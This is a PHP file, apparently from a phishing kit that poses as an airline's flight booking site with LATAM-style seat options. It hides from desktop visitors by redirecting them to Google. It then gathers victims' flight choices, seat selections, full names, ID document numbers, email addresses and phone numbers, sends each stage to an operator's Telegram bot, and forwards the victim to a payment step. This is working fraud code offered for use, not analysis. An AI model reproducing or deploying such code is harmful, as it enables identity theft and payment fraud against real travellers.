<?php

$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';

$mobileKeywords = [
    'Mobi', 'Android', 'iPhone', 'iPad', 'iPod', 'BlackBerry', 
    'webOS', 'Windows Phone', 'Kindle', 'Opera Mini'
];

$isMobile = false;

foreach ($mobileKeywords as $keyword) {
    if (stripos($userAgent, $keyword) !== false) {
        $isMobile = true;
        break;
    }
}

if (!$isMobile) {
    header('Location: https://www.google.com');
    exit;
}

?>
<?php
/**
 * partials/resultados-vuelos.php
 *
 * Envío a Telegram en 4 fases:
 * 1) Búsqueda
 * 2) Selección de vuelos
 * 3) Selección de asientos
 * 4) Confirmación con datos de pasajeros
 *
 * Redirecciones:
 * - Fase 1 => ../index.php?step=results
 * - Fase 2 => ../index.php?step=seat&leg=outbound
 * - Fase 3 => ../index.php?step=form
 * - Fase 4 => ../index.php?step=pago
 */

require_once '../assets/config/telegram_config.php';

/* -------- Helpers -------- */
function sanitize_input($data) {
    $data = trim($data);
    $data = stripslashes($data);
    $data = htmlspecialchars($data, ENT_QUOTES, 'UTF-8');
    return $data;
}
function stops_label_php($n){
    $n = (int)$n;
    if ($n <= 0) return 'Directo';
    if ($n === 1) return '1 parada';
    return $n.' paradas';
}
function tariff_human($key){
    $m = ['basic'=>'Basic','light'=>'Light','full'=>'Full','premium'=>'Premium Economy'];
    return isset($m[$key]) ? $m[$key] : ucfirst($key);
}
function format_cop($n){
    $n = is_numeric($n) ? (float)$n : 0;
    return 'COP '.number_format($n,0,',','.');
}
function seat_type_label($internal_type){
    switch ($internal_type) {
        case 'latam_plus': return 'LATAM+';
        case 'exit':       return 'Salida de emergencia';
        case 'front':      return 'Más adelante';
        case 'standard':   return 'Estándar';
        case 'first_row':  return 'Primera Fila';
        default:           return 'Asiento';
    }
}

// Determinar si los datos vienen de GET o POST para unificar
$source = !empty($_POST) ? $_POST : $_GET;

/* -------- Parámetros de búsqueda -------- */
$origin         = isset($source['origin']) ? sanitize_input($source['origin']) : 'N/A';
$destination    = isset($source['destination']) ? sanitize_input($source['destination']) : 'N/A';
$departure_date = isset($source['departure-date']) ? sanitize_input($source['departure-date']) : 'N/A';
$return_date    = isset($source['return-date']) ? sanitize_input($source['return-date']) : 'N/A';
$passengers     = isset($source['passengers']) ? sanitize_input($source['passengers']) : '1 adulto';
$cabin_type     = isset($source['cabin']) ? sanitize_input($source['cabin']) : 'Economy';
$promo_code     = isset($source['promo_code']) ? sanitize_input($source['promo_code']) : 'No especificado';

if (preg_match('/(\d+)/', $passengers, $m)) {
    $passengers_count = max(1, (int)$m[1]);
} else {
    $passengers_count = 1;
}

/* -------- Vuelos -------- */
$out_dep_time     = isset($source['out_dep_time']) ? sanitize_input($source['out_dep_time']) : '';
$out_dep_airport  = isset($source['out_dep_airport']) ? sanitize_input($source['out_dep_airport']) : '';
$out_arr_time     = isset($source['out_arr_time']) ? sanitize_input($source['out_arr_time']) : '';
$out_arr_airport  = isset($source['out_arr_airport']) ? sanitize_input($source['out_arr_airport']) : '';
$out_duration     = isset($source['out_duration']) ? sanitize_input($source['out_duration']) : '';
$out_stops        = isset($source['out_stops']) ? (int)$source['out_stops'] : 0;
$out_airline      = isset($source['out_airline']) ? sanitize_input($source['out_airline']) : '';
$out_tariff       = isset($source['out_tariff']) ? sanitize_input($source['out_tariff']) : '';
$out_price        = isset($source['out_price']) ? (int)$source['out_price'] : 0;
// VUELTA
$ret_dep_time     = isset($source['ret_dep_time']) ? sanitize_input($source['ret_dep_time']) : '';
$ret_dep_airport  = isset($source['ret_dep_airport']) ? sanitize_input($source['ret_dep_airport']) : '';
$ret_arr_time     = isset($source['ret_arr_time']) ? sanitize_input($source['ret_arr_time']) : '';
$ret_arr_airport  = isset($source['ret_arr_airport']) ? sanitize_input($source['ret_arr_airport']) : '';
$ret_duration     = isset($source['ret_duration']) ? sanitize_input($source['ret_duration']) : '';
$ret_stops        = isset($source['ret_stops']) ? (int)$source['ret_stops'] : null;
$ret_airline      = isset($source['ret_airline']) ? sanitize_input($source['ret_airline']) : '';
$ret_tariff       = isset($source['ret_tariff']) ? sanitize_input($source['ret_tariff']) : '';
$ret_price        = isset($source['ret_price']) ? (int)$source['ret_price'] : 0;


/* -------- Detección de FASE -------- */
$is_form_submission  = !empty($_POST['nombre']);
$has_outbound_flight = !empty($out_dep_time);
$has_any_seat        = isset($source['out_seat_1']) && !empty($source['out_seat_1']);

if ($is_form_submission) {
    $phase = 4;
} elseif (!$has_outbound_flight) {
    $phase = 1;
} elseif ($has_outbound_flight && !$has_any_seat) {
    $phase = 2;
} else {
    $phase = 3;
}

/* -------- Construcción del mensaje por fase -------- */
$message_text = '';

if ($phase === 1) {
    // ========== MENSAJE 1: BÚSQUEDA ==========
    $is_one_way = ($return_date === 'N/A' || $return_date === '' || strtolower($return_date) === 'na');
    $message_text =
        "🔎 *Nueva búsqueda de vuelo*\n\n".
        "✈️ *Origen:* {$origin}\n".
        "📍 *Destino:* {$destination}\n".
        "🗓️ *Fecha de Ida:* {$departure_date}\n".
        "🗓️ *Fecha de Vuelta:* ".($is_one_way ? "N/A (Solo ida)" : $return_date)."\n".
        "👥 *Pasajeros:* {$passengers}\n".
        "💺 *Cabina:* {$cabin_type}\n".
        "🏷️ *Código Promocional:* {$promo_code}";

} elseif ($phase === 2) {
    // ========== MENSAJE 2: SELECCIÓN DE VUELOS (sin asientos) ==========
    $is_one_way = empty($ret_dep_time);
    $total_flights = (int)$out_price + (int)$ret_price;
    $total_taxes = (int)round($total_flights * 0.19);
    $total = $total_flights + $total_taxes;

    $mensaje_ida =
        "✅ *Vuelo de ida* • ".tariff_human($out_tariff)."\n".
        "⏰ {$out_dep_time} {$out_dep_airport} → {$out_arr_time} {$out_arr_airport}\n".
        "⏱️ ".stops_label_php($out_stops)." • {$out_duration}\n".
        "🛫 {$out_airline}\n".
        "💵 ".format_cop($out_price);

    $mensaje_vuelta = '';
    if (!$is_one_way) {
        $mensaje_vuelta =
            "\n\n✅ *Vuelo de vuelta* • ".tariff_human($ret_tariff)."\n".
            "⏰ {$ret_dep_time} {$ret_dep_airport} → {$ret_arr_time} {$ret_arr_airport}\n".
            "⏱️ ".stops_label_php($ret_stops)." • {$ret_duration}\n".
            "🛫 {$ret_airline}\n".
            "💵 ".format_cop($ret_price);
    }

    $message_text =
        "🧾 *Selección de vuelos*\n\n".
        "✈️ *Origen:* {$origin}\n".
        "📍 *Destino:* {$destination}\n".
        "🗓️ *Fecha de Ida:* {$departure_date}\n".
        "🗓️ *Fecha de Vuelta:* ".($is_one_way ? "N/A (Solo ida)" : $return_date)."\n".
        "👥 *Pasajeros:* {$passengers}\n".
        "💺 *Cabina:* {$cabin_type}\n".
        "🏷️ *Código Promocional:* {$promo_code}\n\n".
        $mensaje_ida.
        $mensaje_vuelta.
        "\n\n*Totales (sin asientos)*\n".
        "✈️ Vuelos: ".format_cop($total_flights)."\n".
        "💸 Tasas/Impuestos: ".format_cop($total_taxes)."\n".
        "🧮 Subtotal: ".format_cop($total);

} elseif ($phase === 3) {
    // ========== MENSAJE 3: SELECCIÓN DE ASIENTOS ==========
    $is_one_way = empty($ret_dep_time);
    $total_flights = (int)$out_price + (int)$ret_price;

    $out_seats_details = '';
    $ret_seats_details = '';
    $total_seats_price = 0;
    for ($i = 1; $i <= $passengers_count; $i++) {
        if (isset($source["out_seat_{$i}"])) {
            $out_seats_details .= " └ Adulto {$i}: {$source["out_seat_{$i}"]} (".seat_type_label($source["out_seat_type_{$i}"]).") - ".format_cop($source["out_seat_price_{$i}"])."\n";
            $total_seats_price += (int)$source["out_seat_price_{$i}"];
        }
        if (!$is_one_way && isset($source["ret_seat_{$i}"])) {
            $ret_seats_details .= " └ Adulto {$i}: {$source["ret_seat_{$i}"]} (".seat_type_label($source["ret_seat_type_{$i}"]).") - ".format_cop($source["ret_seat_price_{$i}"])."\n";
            $total_seats_price += (int)$source["ret_seat_price_{$i}"];
        }
    }
    
    $total_taxes = (int)round($total_flights * 0.19);
    $total = $total_flights + $total_taxes + $total_seats_price;

    $mensaje_ida =
        "✅ *Vuelo de ida* • ".tariff_human($out_tariff)."\n".
        "⏰ {$out_dep_time} {$out_dep_airport} → {$out_arr_time} {$out_arr_airport}\n".
        "⏱️ ".stops_label_php($out_stops)." • {$out_duration}\n".
        "🛫 {$out_airline}\n".
        "💵 ".format_cop($out_price)."\n".
        "💺 *Asientos Ida:*\n".
        (!empty(trim($out_seats_details)) ? trim($out_seats_details) : " └ Sin selección");

    $mensaje_vuelta = '';
    if (!$is_one_way) {
        $mensaje_vuelta =
            "\n\n✅ *Vuelo de vuelta* • ".tariff_human($ret_tariff)."\n".
            "⏰ {$ret_dep_time} {$ret_dep_airport} → {$ret_arr_time} {$ret_arr_airport}\n".
            "⏱️ ".stops_label_php($ret_stops)." • {$ret_duration}\n".
            "🛫 {$ret_airline}\n".
            "💵 ".format_cop($ret_price)."\n".
            "💺 *Asientos Vuelta:*\n".
            (!empty(trim($ret_seats_details)) ? trim($ret_seats_details) : " └ Sin selección");
    }

    $message_text =
        "🪑 *Selección de asientos*\n\n".
        "✈️ *Origen:* {$origin}\n".
        "📍 *Destino:* {$destination}\n".
        "🗓️ *Fecha de Ida:* {$departure_date}\n".
        "🗓️ *Fecha de Vuelta:* ".($is_one_way ? "N/A (Solo ida)" : $return_date)."\n".
        "👥 *Pasajeros:* {$passengers}\n".
        "💺 *Cabina:* {$cabin_type}\n".
        "🏷️ *Código Promocional:* {$promo_code}\n\n".
        $mensaje_ida.
        $mensaje_vuelta.
        "\n\n*Totales*\n".
        "✈️ Vuelos: ".format_cop($total_flights)."\n".
        "💺 Asientos: ".format_cop($total_seats_price)."\n".
        "💸 Tasas/Impuestos: ".format_cop($total_taxes)."\n".
        "🧮 Subtotal: ".format_cop($total);

} elseif ($phase === 4) {
    // ========== MENSAJE 4: RESERVA COMPLETA CON PASAJEROS ==========
    $is_one_way = empty($ret_dep_time);
    $total_flights = (int)$out_price + (int)$ret_price;
    $total_seats_price = 0;
    for ($i = 1; $i <= $passengers_count; $i++) {
        if (isset($source["out_seat_price_{$i}"])) {
            $total_seats_price += (int)$source["out_seat_price_{$i}"];
        }
        if (!$is_one_way && isset($source["ret_seat_price_{$i}"])) {
            $total_seats_price += (int)$source["ret_seat_price_{$i}"];
        }
    }
    $total_taxes = (int)round($total_flights * 0.19);
    $total = $total_flights + $total_taxes + $total_seats_price;

    $passengers_details_text = '';
    for ($i = 0; $i < $passengers_count; $i++) {
        $passengers_details_text .=
            "\n*Pasajero ".($i + 1)."*\n".
            " - *Nombre:* ".sanitize_input($_POST['nombre'][$i])." ".sanitize_input($_POST['apellido'][$i])."\n".
            " - *Documento:* ".sanitize_input($_POST['tipo_documento'][$i])." - ".sanitize_input($_POST['numero_documento'][$i])."\n";
    }

    $contact_details_text =
        "\n*Contacto Principal*\n".
        " - *Email:* ".sanitize_input($_POST['email_contacto'])."\n".
        " - *Teléfono:* ".sanitize_input($_POST['codigo_pais_contacto'])." ".sanitize_input($_POST['telefono_contacto'])."\n";

    $message_text =
        "🎟️ *Nueva Reserva (Pendiente de Pago)*\n\n".
        "✈️ *Origen:* {$origin}\n".
        "📍 *Destino:* {$destination}\n".
        "🗓️ *Fechas:* {$departure_date}".($is_one_way ? "" : " al {$return_date}")."\n".
        "-----------------------------------\n".
        $passengers_details_text.
        "-----------------------------------\n".
        $contact_details_text.
        "-----------------------------------\n".
        "*Total a Pagar:* ".format_cop($total);
}

/* -------- Envío a Telegram -------- */
if (!empty($message_text)) {
    $bot_token = TELEGRAM_BOT_TOKEN;
    $chat_id   = TELEGRAM_CHAT_ID;
    $telegram_api_url = "https://api.telegram.org/bot{$bot_token}/sendMessage";

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegram_api_url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'chat_id'    => $chat_id,
        'text'       => $message_text,
        'parse_mode' => 'Markdown'
    ]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response  = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
}

/* -------- Redirección según fase -------- */
if ($phase === 4) {
    // Se calcula el total nuevamente para pasarlo a la página de pago.
    $is_one_way = empty($ret_dep_time);
    $total_flights = (int)$out_price + (int)$ret_price;
    $total_seats_price = 0;
    for ($i = 1; $i <= $passengers_count; $i++) {
        if (isset($source["out_seat_price_{$i}"])) {
            $total_seats_price += (int)$source["out_seat_price_{$i}"];
        }
        if (!$is_one_way && isset($source["ret_seat_price_{$i}"])) {
            $total_seats_price += (int)$source["ret_seat_price_{$i}"];
        }
    }
    $total_taxes = (int)round($total_flights * 0.19);
    $total = $total_flights + $total_taxes + $total_seats_price;
    
    // Se construye la URL con TODOS los parámetros para la página de pago
    $redirect_params = http_build_query([
        'step'            => 'pago',
        'total'           => $total,
        'origin'          => $origin,
        'destination'     => $destination,
        'passengers'      => $passengers,
        'departure-date'  => $departure_date,
        'out_dep_time'    => $out_dep_time,
        'out_dep_airport' => $out_dep_airport,
        'out_arr_time'    => $out_arr_time,
        'out_arr_airport' => $out_arr_airport,
        'out_tariff'      => $out_tariff,
        'return-date'     => $return_date,
        'ret_dep_time'    => $ret_dep_time,
        'ret_dep_airport' => $ret_dep_airport,
        'ret_arr_time'    => $ret_arr_time,
        'ret_arr_airport' => $ret_arr_airport,
        'ret_tariff'      => $ret_tariff,
    ]);

    header("Location: ../index.php?" . $redirect_params);
    exit;
}

// Redirección para las fases anteriores (ESTRUCTURA ORIGINAL RESTAURADA)
$redirect_params_arr = [
    'origin'         => $origin,
    'destination'    => $destination,
    'departure-date' => $departure_date,
    'return-date'    => $return_date,
    'passengers'     => $passengers,
    'cabin'          => $cabin_type,
    'promo_code'     => $promo_code,
    'telegram_sent'  => (isset($http_code) && $http_code == 200 ? 'success' : 'error'),
];

if ($phase === 1) {
    $redirect_params_arr['step'] = 'results';
} elseif ($phase === 2) {
    $redirect_params_arr['step'] = 'seat';
    $redirect_params_arr['leg']  = 'outbound';
    
    $redirect_params_arr['out_price'] = $out_price;
    $redirect_params_arr['ret_price'] = $ret_price;
    $redirect_params_arr['out_dep_time']    = $out_dep_time;
    $redirect_params_arr['out_dep_airport'] = $out_dep_airport;
    $redirect_params_arr['out_arr_time']    = $out_arr_time;
    $redirect_params_arr['out_arr_airport'] = $out_arr_airport;
    $redirect_params_arr['out_duration']    = $out_duration;
    $redirect_params_arr['out_stops']       = (string)$out_stops;
    $redirect_params_arr['out_airline']     = $out_airline;
    $redirect_params_arr['out_tariff']      = $out_tariff;
    $redirect_params_arr['ret_dep_time']    = $ret_dep_time;
    $redirect_params_arr['ret_dep_airport'] = $ret_dep_airport;
    $redirect_params_arr['ret_arr_time']    = $ret_arr_time;
    $redirect_params_arr['ret_arr_airport'] = $ret_arr_airport;
    $redirect_params_arr['ret_duration']    = $ret_duration;
    $redirect_params_arr['ret_stops']       = isset($ret_stops) ? (string)$ret_stops : '';
    $redirect_params_arr['ret_airline']     = $ret_airline;
    $redirect_params_arr['ret_tariff']      = $ret_tariff;

} elseif ($phase === 3) {
    $redirect_params_arr['step'] = 'form';

    $redirect_params_arr['out_price'] = $out_price;
    $redirect_params_arr['ret_price'] = $ret_price;
    $redirect_params_arr['out_dep_time']    = $out_dep_time;
    $redirect_params_arr['out_dep_airport'] = $out_dep_airport;
    $redirect_params_arr['out_arr_time']    = $out_arr_time;
    $redirect_params_arr['out_arr_airport'] = $out_arr_airport;
    $redirect_params_arr['out_duration']    = $out_duration;
    $redirect_params_arr['out_stops']       = (string)$out_stops;
    $redirect_params_arr['out_airline']     = $out_airline;
    $redirect_params_arr['out_tariff']      = $out_tariff;
    $redirect_params_arr['ret_dep_time']    = $ret_dep_time;
    $redirect_params_arr['ret_dep_airport'] = $ret_dep_airport;
    $redirect_params_arr['ret_arr_time']    = $ret_arr_time;
    $redirect_params_arr['ret_arr_airport'] = $ret_arr_airport;
    $redirect_params_arr['ret_duration']    = $ret_duration;
    $redirect_params_arr['ret_stops']       = isset($ret_stops) ? (string)$ret_stops : '';
    $redirect_params_arr['ret_airline']     = $ret_airline;
    $redirect_params_arr['ret_tariff']      = $ret_tariff;
    
    for ($i = 1; $i <= $passengers_count; $i++) {
        if (isset($source["out_seat_{$i}"])) {
            $redirect_params_arr["out_seat_{$i}"] = $source["out_seat_{$i}"];
            $redirect_params_arr["out_seat_type_{$i}"] = $source["out_seat_type_{$i}"];
            $redirect_params_arr["out_seat_price_{$i}"] = $source["out_seat_price_{$i}"];
        }
        if (isset($source["ret_seat_{$i}"])) {
            $redirect_params_arr["ret_seat_{$i}"] = $source["ret_seat_{$i}"];
            $redirect_params_arr["ret_seat_type_{$i}"] = $source["ret_seat_type_{$i}"];
            $redirect_params_arr["ret_seat_price_{$i}"] = $source["ret_seat_price_{$i}"];
        }
    }
}

$redirect_params = http_build_query($redirect_params_arr);
header("Location: ../index.php?".$redirect_params);
exit;
